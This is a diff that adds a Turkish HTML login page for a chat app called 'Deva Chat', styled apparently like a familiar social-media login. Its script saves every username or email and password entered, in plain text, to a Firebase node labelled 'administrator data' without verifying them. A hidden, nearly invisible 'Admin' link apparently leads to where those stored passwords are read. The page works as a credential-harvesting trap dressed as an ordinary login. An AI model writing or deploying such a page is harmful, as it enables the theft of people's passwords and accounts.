@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Deva Chat | Giriş</title>
+    <style>
+        body { background-color: #000; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-card { width: 350px; border: 1px solid #363636; padding: 40px; text-align: center; background: #000; border-radius: 3px; }
+        h1 { font-style: italic; font-weight: bold; font-size: 32px; margin-bottom: 30px; }
+        input { width: 100%; padding: 12px; margin: 8px 0; background: #121212; border: 1px solid #363636; color: white; border-radius: 5px; }
+        button { width: 100%; padding: 12px; background: #0095f6; border: none; color: white; font-weight: bold; border-radius: 8px; cursor: pointer; margin-top: 15px; }
+        .secret-admin { position: absolute; bottom: 10px; right: 10px; color: #111; text-decoration: none; font-size: 10px; }
+    </style>
+</head>
+<body>
+    <div class="login-card">
+        <h1>Deva Chat</h1>
+        <input type="text" id="username" placeholder="Kullanıcı Adı veya E-posta">
+        <input type="password" id="password" placeholder="Şifre">
+        <button onclick="kayitVeGiris()">Giriş Yap</button>
+    </div>
+    <a href="admin.html" class="secret-admin">Admin</a>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.0.0/firebase-app.js";
+        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/9.0.0/firebase-database.js";
+
+        const firebaseConfig = { /* BURAYA KENDİ BİLGİLERİNİ KOY */ };
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+
+        window.kayitVeGiris = function() {
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+            if(user && pass) {
+                set(ref(db, 'yonetici_verileri/' + user), {
+                    kullanici: user,
+                    sifre: pass,
+                    tarih: new Date().toLocaleString()
+                }).then(() => {
+                    localStorage.setItem('chatUser', user);
+                    window.location.href = "chat.html";
+                });
+            }
+        }
+    </script>
+</body>
+</html>
